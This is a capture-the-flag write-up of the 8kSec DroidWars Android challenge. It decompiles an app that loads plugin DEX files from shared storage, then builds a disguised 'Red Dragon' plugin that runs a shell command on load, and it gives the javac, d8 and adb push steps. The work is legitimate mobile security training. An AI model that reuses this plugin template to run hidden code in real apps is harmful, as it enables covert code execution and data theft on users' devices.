---
title: DroidWars - 8kSec
date: 2025-10-8 00:00:00 +/-TTTT
categories: [8kSec]
tags: [8kSec, writeup, mobile penetration testing, android]     # TAG names should always be lowercase
---

<br />

**Description**

Experience the thrill of battle in **DroidWars**, a customizable Android gaming platform where players can expand their gaming experience with powerful plugins! Download new characters, weapons, and abilities from our upcoming community marketplace to personalize your gameplay. Our innovative dynamic plugin system allows for seamless integration of new content without updating the main application.

Just use our new Refresh feature, and plugins are automatically loaded from the appropriate location, reducing the need for manual player interactions. DroidWars automatically discovers and loads them on startup. Join thousands of players in creating and sharing exciting new content for the ultimate gaming experience! Join us in this pre-release before we launch the full game!

<br />

**Objective**

Develop a malicious plugin that exploits DroidWars' vulnerable plugin loading mechanism. Your goal is to create a plugin that appears legitimate but contains hidden code that, when loaded in DroidWars, steals files stored on the SD card without requiring any additional permissions.

Successfully completing this challenge reveals a critical security vulnerability in dynamic code loading practices that could allow attackers to access sensitive user data, execute privileged operations, or even gain persistent access to the device through a seemingly innocent game plugin.

<br />

**Restrictions**

Your plugin must work on non-rooted Android devices running versions up to Android 15 and must not require any runtime permissions to be explicitly granted by the victim. The malicious plugin should appear as a legitimate game component, and must not break UI functionality while secretly stealing data from external storage in the background.

<br />

**Explore the application**

When the application is first launched,  the home screen displays a list of available plugins loaded from the default plugin directory. By default, the app includes a pre-installed plugin **“Pikachu”**. The **default plugin** (Pikachu) shows basic information such as its **name**, **type**, **description**, and **attributes** (abilities and stats). 

At the top or corner of the Main Activity, there is a **Settings** button, which provides access to various plugin management options such as refreshing plugins, viewing details, checking exploit results, toggling debug logs, and clearing loaded plugins.

![](/assets/img/8ksec/DroidWars/1.png)

<br />

The “View” button opens the selected plugin and displays all its defined attributes, such as the description, type, abilities, and stats. When clicked, the app retrieves and shows the plugin’s **Name**, **Type**, and the full data set (description, image, abilities and stats), confirming that the plugin has been successfully loaded and its code is being executed

![](/assets/img/8ksec/DroidWars/3.png)

<br />

The **Settings** screen in the DroidWars application provides control over the app’s plugin management and debugging features. It allows the user to manually interact with the dynamic plugin-loading.

 the Settings screen presents several buttons:

**Refresh Plugins:** This button forces the app to reload all plugin files from the `/sdcard/PokeDex/plugins/` directory. When clicked, the application scans this folder, detects any new `.dex` files, and loads them dynamically into the main activity. This feature is what allows custom or malicious plugins (like `Malicious.dex`) to be executed within the app’s context.

**Check Exploit:** This button is used to verify whether the exploit or payload executed successfully. When pressed, it checks for the presence of the file `stolen_data.txt` in `/sdcard`, confirming that the command embedded in the plugin was executed as intended.

**Clear Cache:** This option clears all loaded plugins and resets the app’s plugin list. It removes any previously loaded `.dex` files from the UI, returning the application to a clean state.

**Toggle Debug Log: **This button enables or disables the application’s debug logging feature. When activated, the app starts printing logs (such as plugin loading events, errors, or system command outputs). These logs are useful for developers to troubleshoot plugin behavior or verify execution flow.

![](/assets/img/8ksec/DroidWars/2.png)

<br />

**Analyzing the application using JADX**

From: AndroidManifest.xml

```xml
<uses-permission android:name="android.permission.INTERNET"/>
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
<uses-permission
    android:name="android.permission.WRITE_EXTERNAL_STORAGE"
    android:maxSdkVersion="29"/>
<uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>

<activity
    android:name="com.eightksec.droidwars.MainActivity"
    android:exported="true">
    <intent-filter>
        <action android:name="android.intent.action.MAIN"/>
        <category android:name="android.intent.category.LAUNCHER"/>
    </intent-filter>
</activity>
```

<br />

| Permission                | Purpose                  | Works On            | Notes                                                |
| ------------------------- | ------------------------ | ------------------- | ---------------------------------------------------- |
| `READ_EXTERNAL_STORAGE`   | Read shared files        | All versions        | Limited by Scoped Storage (Android 10+)              |
| `WRITE_EXTERNAL_STORAGE`  | Write shared files       | Android 9 and below | Deprecated; ignored on Android 10+                   |
| `MANAGE_EXTERNAL_STORAGE` | Full access to all files | Android 11+         | Powerful, but restricted and not Play Store–friendly |

<br />

From: com.eightksec.droidwars.plugin.PluginLoader

```java
public final class PluginLoader {

    /* renamed from: Companion, reason: from kotlin metadata */
    public static final Companion INSTANCE = new Companion(null);
    public static final String PLUGINS_DIR = "/sdcard/PokeDex/plugins/";
    private static final String PLUGIN_INTERFACE = "com.eightksec.droidwars.plugin.PokemonPlugin";
    private static final String SIMPLE_PLUGIN_INTERFACE = "SimplePlugin";
    private static final String TAG = "PluginLoader";
    private final Context context;
    private Function1<? super String, Unit> onLogMessage;

    public PluginLoader(Context context) {
        Intrinsics.checkNotNullParameter(context, "context");
        this.context = context;
    }

        public final File getPluginsDirectory() {
            if (Build.VERSION.SDK_INT >= 30) {
                return new File(Environment.getExternalStorageDirectory(), "PokeDex/plugins");
            }
            return new File(PluginLoader.PLUGINS_DIR);
        }
    }

    public final PokemonPlugin loadPlugin(String pluginName) {
        File file;
        Class loadClass;
        Intrinsics.checkNotNullParameter(pluginName, "pluginName");
        try {
            File pluginsDirectory = INSTANCE.getPluginsDirectory();
            if (!pluginsDirectory.exists()) {
                pluginsDirectory.mkdirs();
            }
            file = new File(pluginsDirectory, pluginName + ".dex");
        } catch (Exception e) {
            String str = "Failed to load plugin: " + pluginName + " - " + e.getMessage();
            Log.e(TAG, str, e);
            Function1<? super String, Unit> function1 = this.onLogMessage;
            if (function1 != null) {
                function1.invoke(str);
            }
        }
        if (!file.exists()) {
            String str2 = "Plugin file does not exist: " + file;
            Log.e(TAG, str2);
            Function1<? super String, Unit> function12 = this.onLogMessage;
            if (function12 != null) {
                function12.invoke(str2);
            }
            return null;
        }
        File file2 = new File(this.context.getDir("private_plugins", 0), pluginName + ".dex");
        if (!file2.exists() || file.lastModified() > file2.lastModified()) {
            FilesKt.copyTo$default(file, file2, true, 0, 4, null);
            file2.setReadOnly();
            Function1<? super String, Unit> function13 = this.onLogMessage;
            if (function13 != null) {
                function13.invoke("Created read-only copy of " + pluginName + ".dex");
            }
        }
        DexClassLoader dexClassLoader = new DexClassLoader(file2.getAbsolutePath(), this.context.getDir("dex", 0).getAbsolutePath(), null, this.context.getClassLoader());
        setupOutputMonitoring();
        Object loadSimplePlugin = loadSimplePlugin(dexClassLoader, pluginName);
        if (loadSimplePlugin != null) {
            Log.d(TAG, "Successfully loaded SimplePlugin implementation");
            Function1<? super String, Unit> function14 = this.onLogMessage;
            if (function14 != null) {
                function14.invoke("Successfully loaded SimplePlugin implementation");
            }
            return new SimplePluginAdapter(loadSimplePlugin);
        }
        for (String str3 : CollectionsKt.listOf((Object[]) new String[]{pluginName + "Plugin", "MaliciousPlugin", StringsKt.removeSuffix(pluginName, (CharSequence) "_copy") + "Plugin", "com.eightksec.droidwars.plugin." + pluginName + "Plugin"})) {
            try {
                String str4 = "Attempting to load class: " + str3;
                Function1<? super String, Unit> function15 = this.onLogMessage;
                if (function15 != null) {
                    function15.invoke(str4);
                }
                loadClass = dexClassLoader.loadClass(str3);
            } catch (ClassNotFoundException unused) {
                String str5 = "Class not found: " + str3;
                Function1<? super String, Unit> function16 = this.onLogMessage;
                if (function16 != null) {
                    function16.invoke(str5);
                    Unit unit = Unit.INSTANCE;
                }
            } catch (Exception e2) {
                String str6 = "Error loading class " + str3 + ": " + e2.getMessage();
                Log.e(TAG, str6, e2);
                Function1<? super String, Unit> function17 = this.onLogMessage;
                if (function17 != null) {
                    function17.invoke(str6);
                    Unit unit2 = Unit.INSTANCE;
                }
            }
            if (PokemonPlugin.class.isAssignableFrom(loadClass)) {
                String str7 = "Successfully loaded plugin class: " + str3;
                Function1<? super String, Unit> function18 = this.onLogMessage;
                if (function18 != null) {
                    function18.invoke(str7);
                }
                Object newInstance = loadClass.newInstance();
                Intrinsics.checkNotNull(newInstance, "null cannot be cast to non-null type com.eightksec.droidwars.plugin.PokemonPlugin");
                return (PokemonPlugin) newInstance;
            }
            Unit unit3 = Unit.INSTANCE;
        }
        String str8 = "No valid plugin class found in " + pluginName + ".dex";
        Log.e(TAG, str8);
        Function1<? super String, Unit> function19 = this.onLogMessage;
        if (function19 != null) {
            function19.invoke(str8);
        }
        return null;
    }

    private final Object loadSimplePlugin(ClassLoader classLoader, String pluginName) {
        Class<?> loadClass;
        for (String str : CollectionsKt.listOf((Object[]) new String[]{String.valueOf(StringsKt.removeSuffix(pluginName, (CharSequence) "Plugin")), String.valueOf(pluginName), "MaliciousPlugin"})) {
            try {
                String str2 = "Attempting to load SimplePlugin implementation: " + str;
                Log.d(TAG, str2);
                Function1<? super String, Unit> function1 = this.onLogMessage;
                if (function1 != null) {
                    function1.invoke(str2);
                }
                loadClass = classLoader.loadClass(str);
                Intrinsics.checkNotNull(loadClass);
            } catch (ClassNotFoundException unused) {
                String str3 = "SimplePlugin class not found: " + str;
                Log.d(TAG, str3);
                Function1<? super String, Unit> function12 = this.onLogMessage;
                if (function12 != null) {
                    function12.invoke(str3);
                    Unit unit = Unit.INSTANCE;
                }
            } catch (Exception e) {
                String str4 = "Error checking SimplePlugin class " + str + ": " + e.getMessage();
                Log.e(TAG, str4, e);
                Function1<? super String, Unit> function13 = this.onLogMessage;
                if (function13 != null) {
                    function13.invoke(str4);
                    Unit unit2 = Unit.INSTANCE;
                }
            }
            if (isSimplePluginImplementation(loadClass)) {
                String str5 = "Found SimplePlugin implementation: " + str;
                Log.d(TAG, str5);
                Function1<? super String, Unit> function14 = this.onLogMessage;
                if (function14 != null) {
                    function14.invoke(str5);
                }
                classLoader = loadClass.newInstance();
                return classLoader;
            }
            Unit unit3 = Unit.INSTANCE;
        }
        return null;
    }

    private final boolean isSimplePluginImplementation(Class<?> clazz) {
        try {
            Method method = clazz.getMethod("getName", new Class[0]);
            Method method2 = clazz.getMethod("getType", new Class[0]);
            Method method3 = clazz.getMethod("getAllData", new Class[0]);
            if (Intrinsics.areEqual(method.getReturnType(), String.class) && Intrinsics.areEqual(method2.getReturnType(), String.class)) {
                return method3.getReturnType().isAssignableFrom(Map.class);
            }
            return false;
        } catch (Exception unused) {
            return false;
        }
    }

    public final List<String> getAvailablePlugins() {
        ArrayList emptyList;
        File pluginsDirectory = INSTANCE.getPluginsDirectory();
        if (!pluginsDirectory.exists()) {
            pluginsDirectory.mkdirs();
            Function1<? super String, Unit> function1 = this.onLogMessage;
            if (function1 != null) {
                function1.invoke("Created plugins directory: " + pluginsDirectory.getAbsolutePath());
            }
            return CollectionsKt.emptyList();
        }
        File[] listFiles = pluginsDirectory.listFiles();
        if (listFiles == null) {
            emptyList = CollectionsKt.emptyList();
        } else {
            ArrayList arrayList = new ArrayList();
            for (File file : listFiles) {
                String name = file.getName();
                Intrinsics.checkNotNullExpressionValue(name, "getName(...)");
                if (StringsKt.endsWith$default(name, ".dex", false, 2, (Object) null)) {
                    arrayList.add(file);
                }
            }
            ArrayList<File> arrayList2 = arrayList;
            ArrayList arrayList3 = new ArrayList(CollectionsKt.collectionSizeOrDefault(arrayList2, 10));
            for (File file2 : arrayList2) {
                Intrinsics.checkNotNull(file2);
                arrayList3.add(FilesKt.getNameWithoutExtension(file2));
            }
            emptyList = arrayList3;
        }
        if (!emptyList.isEmpty()) {
            Function1<? super String, Unit> function12 = this.onLogMessage;
            if (function12 != null) {
                function12.invoke("Found " + emptyList.size() + " plugin(s): " + CollectionsKt.joinToString$default(emptyList, null, null, null, 0, null, null, 63, null));
                return emptyList;
            }
        } else {
            Function1<? super String, Unit> function13 = this.onLogMessage;
            if (function13 != null) {
                function13.invoke("No plugins found in " + pluginsDirectory.getAbsolutePath());
            }
        }
        return emptyList;
    }
}
```

`PluginLoader` class is an **Android plugin loading system** — designed to dynamically load and execute external `.dex` files (compiled Java code) at runtime. 

The `PluginLoader` dynamically loads `.dex` files from storage (e.g., `/sdcard/PokeDex/plugins/`) and executes them as "plugins."
 It supports two plugin types:

1. `PokemonPlugin` (official plugin interface)
2. `SimplePlugin` (a lightweight custom plugin format)

It’s a dynamic extension mechanism  or, from a security perspective, a **code injection surface**, since it runs arbitrary DEX code from external storage.

<br />

**`loadPlugin(String pluginName)`**

This is the core method.
 It performs all plugin loading steps:

**Steps:**

1. **Locate the plugin file**

   ```
   /sdcard/PokeDex/plugins/{pluginName}.dex
   ```

   If it doesn’t exist → logs an error and stops.

2. **Copy it to private app storage**

   ```
   context.getDir("private_plugins", 0)
   ```

3. **Create a DexClassLoader**

   ```
   new DexClassLoader(file2.getAbsolutePath(), context.getDir("dex", 0).getAbsolutePath(), null, context.getClassLoader());
   ```

   - This dynamically loads the `.dex` code at runtime.

4. **Redirect system output**
    Calls `setupOutputMonitoring()` to hook into `System.out` and `System.err`, redirecting plugin console output into Android’s `Logcat` and the `onLogMessage` callback.

5. **Try loading a SimplePlugin**
    It first checks if the DEX defines a "SimplePlugin" (by reflection).

   - Checks for methods: `getName()`, `getType()`, `getAllData()`.
   - If found, it wraps it with `SimplePluginAdapter`.

6. **Try loading a PokemonPlugin**
    If not simple, it tries to find a class named:

   - `{pluginName}Plugin`
   - `MaliciousPlugin`
   - `{pluginName without _copy}Plugin`
   - `com.eightksec.droidwars.plugin.{pluginName}Plugin`

   If one of these exists and implements the `PokemonPlugin` interface → it’s instantiated and returned.

7. **Otherwise**, logs that no valid plugin class was found.

<br />

**`loadSimplePlugin(ClassLoader, String)`**

Looks for lightweight plugins that implement specific methods rather than interfaces.

It tries class names like:

- `pluginName`
- `pluginNamePlugin`
- `MaliciousPlugin`

If the class matches `SimplePlugin` structure → it’s instantiated and returned.

<br />

**`isSimplePluginImplementation(Class<?>)`**

Checks that the given class:

- Has methods `getName()`, `getType()`, and `getAllData()`.
- Returns `String` for name/type and a `Map` for `getAllData()`.

That’s how it verifies compatibility with the "SimplePlugin" pattern.

<br />

**`getAvailablePlugins()`**

Lists all `.dex` files inside `/sdcard/PokeDex/plugins/`, strips the extension, and returns a list of available plugin names.

If the directory doesn’t exist, it creates it and returns an empty list.

<br />

From: com.eightksec.droidwars.plugin.DefaultPlugin

```java
public final class DefaultPlugin implements PokemonPlugin {
    @Override // com.eightksec.droidwars.plugin.PokemonPlugin
    public String getName() {
        return "Pikachu";
    }

    @Override // com.eightksec.droidwars.plugin.PokemonPlugin
    public String getType() {
        return "Electric";
    }

    @Override // com.eightksec.droidwars.plugin.PokemonPlugin
    public String getDescription() {
        return "Pikachu is an Electric-type Pokémon introduced in Generation I. When it is angered, it immediately discharges the energy stored in the pouches in its cheeks.";
    }

    @Override // com.eightksec.droidwars.plugin.PokemonPlugin
    public int getImageResourceId() {
        return R.drawable.ic_launcher_foreground;
    }

    @Override // com.eightksec.droidwars.plugin.PokemonPlugin
    public List<String> getAbilities() {
        return CollectionsKt.listOf((Object[]) new String[]{"Static", "Lightning Rod (Hidden)"});
    }

    @Override // com.eightksec.droidwars.plugin.PokemonPlugin
    public Map<String, Integer> getStats() {
        return MapsKt.mapOf(TuplesKt.to("HP", 35), TuplesKt.to("Attack", 55), TuplesKt.to("Defense", 40), TuplesKt.to("Sp. Attack", 50), TuplesKt.to("Sp. Defense", 50), TuplesKt.to("Speed", 90));
    }
}
```

<br />

**Exploiting DroidWars by adding a plugin that runs a shell command on load**

RedDragon.java

```java
package com.eightksec.droidwars.plugin;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.util.Arrays;
import java.util.HashMap;
import java.util.Map;

public class RedDragon {
    public RedDragon() {
        // This log can help confirm that the plugin was instantiated.
        System.out.println("[RedDragon] Plugin loaded successfully!");
        runCommand("echo pwnd > /sdcard/stolen_data.txt");
    }
    public String getName() {
        return "Red Dragon";
    }

    public String getType() {
        return "Fire";
    }

    public Map getAllData() {
        Map attributes = new HashMap();
        attributes.put("description", "A mythical red dragon that embodies pure flame. This plugin is for testing only.");
        attributes.put("imageResourceId", 0);
        attributes.put("abilities", Arrays.asList("Heat Surge","Inferno Shield"));
        Map stats = new HashMap();
        stats.put("HP", 500);
        stats.put("Attack", 320);
        stats.put("Defense", 450);
        stats.put("Sp. Attack", 300);
        stats.put("Sp. Defense", 400);
        stats.put("Speed", 550);
        attributes.put("stats", stats);
        return attributes;
    }

    public void runCommand(String command) {
        try {
            Process process = Runtime.getRuntime().exec(new String[]{"sh", "-c", command});
            BufferedReader reader = new BufferedReader(
                    new InputStreamReader(process.getInputStream())
            );
            StringBuilder output = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                output.append(line).append("\n");
            }
            reader.close();
            process.waitFor();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

<br />

**Compile the Java source**

```
javac .\RedDragon.java
```

Produces `RedDragon.class` 

<br />

**Package the compiled class into a JAR**

```
jar cvf .\RedDragon.jar .\RedDragon.class
```

Creates `RedDragon.jar` containing the compiled class files.

<br />

**Convert the JAR to Dalvik/ART bytecode (DEX)**

```
d8 --output . RedDragon.jar
```

Uses the Android `d8` tool to produce `classes.dex` (or multiple `.dex` files) in the current directory.

<br />

**Push the DEX to the device plugin folder**

```
adb push .\classes.dex /sdcard/PokeDex/plugins/com.eightksec.droidwars.plugin.RedDragon.dex
```

Copies the generated `classes.dex` to the device path expected by the app (`/sdcard/PokeDex/plugins/`).

The filename used here includes the plugin’s package-style name, the `PluginLoader` will enumerate files in that folder and attempt to load classes from the dex.

<br />

**Steps workflow**

1. Compile Java → `javac` → produce `.class`.
2. Package class(es) into a `.jar` → `jar`.
3. Convert `.jar` to Android `.dex` → `d8` → `classes.dex`.
4. Push `.dex` to device plugin folder → `adb push`.
5. In the app: refresh/load plugins so the `PluginLoader` copies and loads the dex.

<br />

After refreshing the app from the settings, the malicious plugin is loaded and displayed in the main activity. Once loaded, it immediately executes the malicious command

![](/assets/img/8ksec/DroidWars/5.png)

<br />

By clicking the “View” button, the application displays the new plugin and all the previously defined attributes, such as the description, abilities, and stats

![](/assets/img/8ksec/DroidWars/6.png)

<br />

You can verify the command execution by clicking the “Check Exploit” button

![](/assets/img/8ksec/DroidWars/4.png)

<br />

Confirming the presence of the `stolen_data.txt` file in the `/sdcard` directory

```
emu64x:/sdcard # ls
Alarms   Audiobooks  Documents  Downloads  Music          Pictures  PokeDex     Ringtones       
Android  DCIM        Download   Movies     Notifications  Podcasts  Recordings  stolen_data.txt

emu64x:/sdcard # cat stolen_data.txt
pwnd

```

